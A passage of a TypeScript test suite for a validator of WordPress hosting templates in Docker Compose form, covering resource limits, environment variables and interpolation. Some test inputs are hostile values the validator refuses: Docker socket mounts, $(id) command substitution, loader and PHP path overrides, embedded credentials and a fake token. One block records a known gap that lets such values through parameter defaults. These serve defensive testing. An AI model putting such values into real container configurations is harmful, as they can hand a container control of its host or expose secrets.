  it("an empty x-hp-php block and a null one are refused, not treated as absent", () => {
    refused(php("{}"), "PHP_EMPTY", "x-hp-php");
    const nothing = template().replace("volumes:\n  html", () => "x-hp-php:\nvolumes:\n  html");
    const codes = codesAt(nothing, "x-hp-php");
    expect(codes).toHaveLength(1);
    expect(["TYPE_MISMATCH", "PHP_EMPTY"]).toContain(codes[0]);
  });
});

describe("limits in other spellings", () => {
  const CPUS = `${SERVICE}.deploy.resources.limits.cpus`;
  const MEMORY = `${SERVICE}.deploy.resources.limits.memory`;
  const cpus = (value: string): string => template({ limits: [value, "512M"] });
  const memory = (value: string): string => template({ limits: ['"1.0"', value] });

  it.each([
    ["0.099", "LIMIT_CPU_RANGE"],
    ["0.1", null],
    ["0.100", null],
    ["64", null],
    ["64.0", null],
    ["64.000", null],
    ["64.001", "LIMIT_CPU_RANGE"],
    ["65", "LIMIT_CPU_RANGE"],
    ["999", "LIMIT_CPU_RANGE"],
    ["0", "LIMIT_CPU_RANGE"],
    ["0.0", "LIMIT_CPU_RANGE"],
    ["00.5", "LIMIT_CPU_FORMAT"],
    ["064", "LIMIT_CPU_FORMAT"],
    [".5", "LIMIT_CPU_FORMAT"],
    ["1.", "LIMIT_CPU_FORMAT"],
    ["1.5555", "LIMIT_CPU_FORMAT"],
    ["1,5", "LIMIT_CPU_FORMAT"],
    ["1e0", "LIMIT_CPU_FORMAT"],
    ["1e3", "LIMIT_CPU_FORMAT"],
    ["0x10", "LIMIT_CPU_FORMAT"],
    ["+1", "LIMIT_CPU_FORMAT"],
    ["-0.5", "LIMIT_CPU_FORMAT"],
    ["1000", "LIMIT_CPU_FORMAT"],
    ['"1 "', "LIMIT_CPU_FORMAT"],
    ['" 1"', "LIMIT_CPU_FORMAT"],
    ['"1\\n"', "LIMIT_CPU_FORMAT"],
    ['"500m"', "LIMIT_CPU_FORMAT"],
    ['"1cpu"', "LIMIT_CPU_FORMAT"],
    ['"max"', "LIMIT_CPU_FORMAT"],
    ['"${X}"', "LIMIT_CPU_FORMAT"],
    ['"${php_version}"', "LIMIT_CPU_FORMAT"],
    ["inf", "LIMIT_CPU_FORMAT"],
    [".inf", "LIMIT_CPU_FORMAT"],
    [".nan", "LIMIT_CPU_FORMAT"],
  ])("cpus %s", (value, code) => {
    if (code === null) expect(validateSiteTemplateSource(cpus(value), "wordpress").ok).toBe(true);
    else refused(cpus(value), code, CPUS);
  });

  it.each([
    ["true", "TYPE_MISMATCH"],
    ["[1]", "TYPE_MISMATCH"],
    ["{ n: 1 }", "TYPE_MISMATCH"],
  ])("cpus of the wrong type %s", (value, code) => {
    refused(cpus(value), code, CPUS);
  });

  it.each([
    ["128M", null],
    ["128m", null],
    ["128MB", null],
    ["128Mb", null],
    ["131072K", null],
    ["131072k", null],
    ["131072KB", null],
    ["0.125G", "LIMIT_MEMORY_FORMAT"],
    ["134217728", null],
    ["134217728B", null],
    ["134217728b", null],
    ["1G", null],
    ["1g", null],
    ["1GB", null],
    ["64G", null],
    ["65536M", null],
    ["67108864K", null],
    ["68719476736", null],
    ["127M", "LIMIT_MEMORY_RANGE"],
    ["134217727", "LIMIT_MEMORY_RANGE"],
    ["131071K", "LIMIT_MEMORY_RANGE"],
    ["1B", "LIMIT_MEMORY_RANGE"],
    ["1K", "LIMIT_MEMORY_RANGE"],
    ["65G", "LIMIT_MEMORY_RANGE"],
    ["65537M", "LIMIT_MEMORY_RANGE"],
    ["68719476737", "LIMIT_MEMORY_RANGE"],
    ["999999999999G", "LIMIT_MEMORY_RANGE"],
    ["999999999999", "LIMIT_MEMORY_RANGE"],
    ["512MiB", "LIMIT_MEMORY_FORMAT"],
    ["512Mi", "LIMIT_MEMORY_FORMAT"],
    ["1GiB", "LIMIT_MEMORY_FORMAT"],
    ["1Gi", "LIMIT_MEMORY_FORMAT"],
    ["1T", "LIMIT_MEMORY_FORMAT"],
    ["1TB", "LIMIT_MEMORY_FORMAT"],
    ["512 M", "LIMIT_MEMORY_FORMAT"],
    ['" 512M"', "LIMIT_MEMORY_FORMAT"],
    ['"512M "', "LIMIT_MEMORY_FORMAT"],
    ['"512M\\n"', "LIMIT_MEMORY_FORMAT"],
    ["1e9", "LIMIT_MEMORY_FORMAT"],
    ["1E9", "LIMIT_MEMORY_FORMAT"],
    ["1e3M", "LIMIT_MEMORY_FORMAT"],
    ["0x200M", "LIMIT_MEMORY_FORMAT"],
    ["0", "LIMIT_MEMORY_FORMAT"],
    ["0M", "LIMIT_MEMORY_FORMAT"],
    ["-512M", "LIMIT_MEMORY_FORMAT"],
    ["+512M", "LIMIT_MEMORY_FORMAT"],
    ["512.5M", "LIMIT_MEMORY_FORMAT"],
    ["512.0M", "LIMIT_MEMORY_FORMAT"],
    ["0512M", "LIMIT_MEMORY_FORMAT"],
    ["1000000000000M", "LIMIT_MEMORY_FORMAT"],
    ['"max"', "LIMIT_MEMORY_FORMAT"],
    ['"-1"', "LIMIT_MEMORY_FORMAT"],
    ['"${X}M"', "LIMIT_MEMORY_FORMAT"],
    ["unlimited", "LIMIT_MEMORY_FORMAT"],
    [".inf", "LIMIT_MEMORY_FORMAT"],
  ])("memory %s", (value, code) => {
    if (code === null) expect(validateSiteTemplateSource(memory(value), "wordpress").ok).toBe(true);
    else refused(memory(value), code, MEMORY);
  });

  it("memory of the wrong type", () => {
    refused(memory("true"), "TYPE_MISMATCH", MEMORY);
    refused(memory("[512]"), "TYPE_MISMATCH", MEMORY);
  });

  it("a deploy block with only one of the two limits, or with none", () => {
    const only = (line: string): string => template().replace(/ {10}cpus:.*\n {10}memory:.*\n/, `${line}\n`);
    refused(only("          cpus: 1"), "LIMIT_INCOMPLETE", "services.app.deploy.resources.limits");
    refused(only("          memory: 512M"), "LIMIT_INCOMPLETE", "services.app.deploy.resources.limits");
    refused(only("          {}").replace("limits:\n          {}", "limits: {}"), "LIMIT_INCOMPLETE", "services.app.deploy.resources.limits");
  });

  it.each([
    ["pids", "pids: 100000", "KEY_UNSUPPORTED"],
    ["devices", "devices: [{ capabilities: [gpu] }]", "KEY_UNSUPPORTED"],
    ["nvidia", "nvidia: 1", "KEY_UNKNOWN"],
    ["cpu", "cpu: 1", "KEY_UNKNOWN"],
    ["memory_swap", "memory_swap: 1G", "KEY_UNKNOWN"],
  ])("the extra limit key %s", (key, line, code) => {
    const source = template().replace("          cpus:", `          ${line}\n          cpus:`);
    refused(source, code, `${SERVICE}.deploy.resources.limits.${key}`);
  });
});

describe("environment in other spellings", () => {
  const env = (...lines: string[]): string => template({ service: ["environment:", ...lines.map((line) => `  ${line}`)] });
  const ENV = `${SERVICE}.environment`;

  it.each([
    ["A=B", "an equals sign"],
    ["A\nB", "a newline"],
    ["A B", "a space"],
    ["A-B", "a dash"],
    ["A.B", "a dot"],
    ["a", "lower case"],
    ["Wp_Debug", "mixed case"],
    ["${X}", "an interpolation"],
    ["", "nothing"],
    ["A".repeat(65), "65 characters"],
    ["1A", "a leading digit"],
    ["É", "a non-ASCII letter"],
  ])("environment as a map: the name %j (%s)", (name) => {
    refused(env(`${q(name)}: "1"`), "ENV_NAME_INVALID", keyPath("services", "app", "environment", name));
  });

  it.each([
    ["A=B=C", null],
    ["A==", null],
    ["A=", null],
    ["=A", "ENV_NAME_INVALID"],
    ["=", "ENV_NAME_INVALID"],
    ["a=1", "ENV_NAME_INVALID"],
    ["A B=1", "ENV_NAME_INVALID"],
    ["A\\nB=1", "ENV_NAME_INVALID"],
    ["WP_X", "ENV_VALUE_MISSING"],
    ["", "ENV_VALUE_MISSING"],
    ["HP_X=1", "ENV_NAME_RESERVED"],
    ["PATH=/usr/bin", "ENV_NAME_RESERVED"],
    ["LD_LIBRARY_PATH=/x", "ENV_NAME_RESERVED"],
    ["DOCKER_HOST=tcp://x", "ENV_NAME_RESERVED"],
    ["DB_PASSWORD_FILE=/x", "ENV_NAME_RESERVED"],
    ["PHPRC=/x", "ENV_NAME_RESERVED"],
    ["PHP_INI_SCAN_DIR=/x", "ENV_NAME_RESERVED"],
    ["PORT=8080", "ENV_NAME_RESERVED"],
    ["DB_PASSWORD=x", "ENV_NAME_SECRET_LIKE"],
    ["WORDPRESS_DB_PASSWORD=x", "ENV_NAME_SECRET_LIKE"],
    ["MY_API_KEY=x", "ENV_NAME_SECRET_LIKE"],
    ["APIKEY=x", "ENV_NAME_SECRET_LIKE"],
    ["WP_X=unix:///var/run/docker.sock", "ENV_VALUE_DOCKER_SOCKET"],
    ["WP_X=/VAR/RUN/DOCKER.SOCK", "ENV_VALUE_DOCKER_SOCKET"],
    ["WP_X=${HP_SITE_ID}:/var/run/docker.sock", "ENV_VALUE_DOCKER_SOCKET"],
    ["WP_X=https://u:pw12345@h.test", "ENV_VALUE_SECRET_LIKE"],
    ["WP_X=${HP_SITE_URL}$", "INTERP_SYNTAX"],
    ["WP_X=${${HP_SITE_ID}}", "INTERP_SYNTAX"],
    ["WP_X=${HP_SITE_ID:-x}", "INTERP_SYNTAX"],
    ["WP_X=${HP_SITE_ID-x}", "INTERP_SYNTAX"],
    ["WP_X=${HP_SITE_ID?x}", "INTERP_SYNTAX"],
    ["WP_X=$HP_SITE_ID", "INTERP_SYNTAX"],
    ["WP_X=$(id)", "INTERP_SYNTAX"],
    ["WP_X=`id`", null],
    ["WP_X=${HP_ROOT_PASSWORD}", "INTERP_UNKNOWN_VARIABLE"],
    ["WP_X=${hp_site_id}", "INTERP_UNKNOWN_VARIABLE"],
    ["WP_X=${HP_SITE_ID }", "INTERP_SYNTAX"],
    ["WP_X=${ HP_SITE_ID}", "INTERP_SYNTAX"],
    ["WP_X=${HP_MODULE_IMAGE}", "INTERP_MODULE_IMAGE_MISPLACED"],
    ["WP_X=${HP_SITE_ID}${HP_MODULE_IMAGE}", "INTERP_MODULE_IMAGE_MISPLACED"],
    ["WP_X=${PHP_VERSION}", "INTERP_UNKNOWN_VARIABLE"],
    ["WP_X=${HOME}", "INTERP_UNKNOWN_VARIABLE"],
    ["WP_X=${PATH}", "INTERP_UNKNOWN_VARIABLE"],
  ])("environment as a list: %j", (entry, code) => {
    const source = env(`- ${q(entry)}`.replace(/\\\\n/g, "\\n"));
    if (code === null) expect(validateSiteTemplateSource(source, "wordpress").ok, entry).toBe(true);
    else refused(source, code, `${ENV}[0]`);
  });

  it("an environment value with an escaped dollar is a literal, and '$$' before a placeholder keeps the placeholder", () => {
    const result = validateSiteTemplateSource(env('WP_X: "$$HP_SITE_ID"', 'WP_Y: "$${HP_SITE_ID}"', 'WP_Z: "$$${HP_SITE_ID}"'), "wordpress");
    expect(result.ok).toBe(true);
    if (result.ok) expect(result.spec.service.environment.map((entry) => entry.value)).toEqual(["$$HP_SITE_ID", "$${HP_SITE_ID}", "$$${HP_SITE_ID}"]);
  });

  it("an environment value of the wrong type or taken from the host", () => {
    refused(env("WP_X: [a]"), "TYPE_MISMATCH", `${ENV}.WP_X`);
    refused(env("WP_X: { a: b }"), "TYPE_MISMATCH", `${ENV}.WP_X`);
    refused(env("WP_X:"), "ENV_VALUE_MISSING", `${ENV}.WP_X`);
    refused(env("WP_X: ~"), "ENV_VALUE_MISSING", `${ENV}.WP_X`);
    refused(env("- 1"), "TYPE_MISMATCH", `${ENV}[0]`);
    refused(env("- { A: b }"), "TYPE_MISMATCH", `${ENV}[0]`);
  });

  it("mixes of the two forms and the same name twice in the list form", () => {
    refused(env("- WP_X=1", "- WP_X=2"), "ENV_NAME_DUPLICATE", `${ENV}[1]`);
    refused(env("- WP_X=1", "- WP_X"), "ENV_VALUE_MISSING", `${ENV}[1]`);
  });

  it("an environment name that is secret-like is refused whatever the value, even an interpolated one", () => {
    for (const value of ["", "x", "${HP_SITE_ID}", "$$"]) refused(env(`DB_PASSWORD: ${q(value)}`), "ENV_NAME_SECRET_LIKE", `${ENV}.DB_PASSWORD`);
  });

  it("a parameter value placed in the environment is bounded by its type", () => {
    const withString = template({
      service: ["environment:", '  WP_X: "${blob}${blob}${blob}${blob}${blob}${blob}${blob}${blob}${blob}${blob}${blob}${blob}${blob}${blob}${blob}${blob}${blob}"'],
    }).replace("services:", () => '  - key: blob\n    label: Blob\n    type: string\n    default: "x"\nservices:');
    refused(withString, "ENV_VALUE_TOO_LONG", `${ENV}.WP_X`);
  });
});

describe("interpolation in places where it must not be expanded", () => {
  it("a parameter key, a label and a default never expand a placeholder", () => {
    const param = (lines: string): string =>
      template().replace("services:", () => `${lines}\nservices:`);
    refused(param('  - key: "${x}"\n    label: A\n    type: boolean\n    default: true'), "PARAM_KEY_INVALID", "x-hp-parameters[1].key");
    refused(param('  - key: s\n    label: A\n    type: string\n    default: "${HP_SITE_ID}"'), "PARAM_DEFAULT_INVALID", "x-hp-parameters[1].default");
    refused(param('  - key: s\n    label: A\n    type: string\n    default: "a$$b"'), "PARAM_DEFAULT_INVALID", "x-hp-parameters[1].default");
    refused(param('  - key: hp_site\n    label: A\n    type: boolean\n    default: true'), "PARAM_KEY_INVALID", "x-hp-parameters[1].key");
    refused(param('  - key: Php\n    label: A\n    type: boolean\n    default: true'), "PARAM_KEY_INVALID", "x-hp-parameters[1].key");
    refused(param('  - key: php_version\n    label: A\n    type: boolean\n    default: true'), "PARAM_KEY_DUPLICATE", "x-hp-parameters[1].key");
  });

  it("x-hp-module and the php settings never expand a placeholder", () => {
    refused(template().replace("x-hp-module: wordpress", () => 'x-hp-module: "${HP_MODULE}"'), "MODULE_MISMATCH", "x-hp-module");
    refused(template({ top: [] }).replace("volumes:\n  html", () => 'x-hp-php: { upload_max_filesize: "${size}" }\nvolumes:\n  html'), "PHP_VALUE_INVALID", "x-hp-php.upload_max_filesize");
  });
});

describe("known gap: text that reaches an environment value through a parameter", () => {
  // envValueProblem checks the literal text only ("before any ${NAME} is filled in", design rule 26), and a string default
  // or an enum option is not scanned for a secret or the docker socket. This pins the CURRENT behaviour so a change is visible:
  // the rendered value is still refused later by the executor spec gate (findUnsafeDockerInputFields).
  const viaParameter = (parameter: string[], value: string): string =>
    template({ service: ["environment:", `  WP_X: ${q(value)}`] }).replace("services:", () => `${parameter.join("\n")}\nservices:`);

  it.each([
    ["a string default holding the docker socket", ["  - key: s", "    label: S", "    type: string", '    default: "unix:///var/run/docker.sock"']],
    ["a string default holding a token", ["  - key: s", "    label: S", "    type: string", `    default: "ghp_${"a".repeat(30)}"`]],
    ["an enum option named like the socket file", ["  - key: s", "    label: S", "    type: enum", '    options: ["docker.sock"]', '    default: "docker.sock"']],
  ])("accepts %s", (_name, parameter) => {
    expect(validateSiteTemplateSource(viaParameter(parameter, "${s}"), "wordpress").ok).toBe(true);
  });
});

describe("a parameter can only be used for what it is", () => {
  it("a customer string parameter cannot be used in the image or a volume", () => {
    const source = template({ image: q("wordpress:${tag}") }).replace("services:", () => '  - key: tag\n    label: T\n    type: string\n    default: "7.1.4-php8.4-apache"\n    customer: true\nservices:');
    refused(source, "IMAGE_VARIABLE_NOT_ALLOWED", `${SERVICE}.image`);
    const volume = template({ volumes: ["- html:/var/www/html", '- "${tag}:/data"'] }).replace("services:", () => '  - key: tag\n    label: T\n    type: string\n    default: "x"\nservices:');
    expect(codesAt(volume, `${SERVICE}.volumes[1]`).length).toBeGreaterThan(0);
  });

  it("a size parameter cannot be a customer choice, and php_version must stay a customer enum", () => {
    const size = template().replace("services:", '  - key: s\n    label: S\n    type: size\n    default: 64M\n    customer: true\nservices:');
    refused(size, "PARAM_CUSTOMER_NOT_ALLOWED", "x-hp-parameters[1].customer");
    refused(template().replace("customer: true", "customer: false"), "PHP_PARAM_INVALID", "x-hp-parameters[0]");
    refused(template().replace("type: enum", "type: string").replace(/ {4}options:.*\n/, ""), "PHP_PARAM_INVALID", "x-hp-parameters[0]");
  });
});
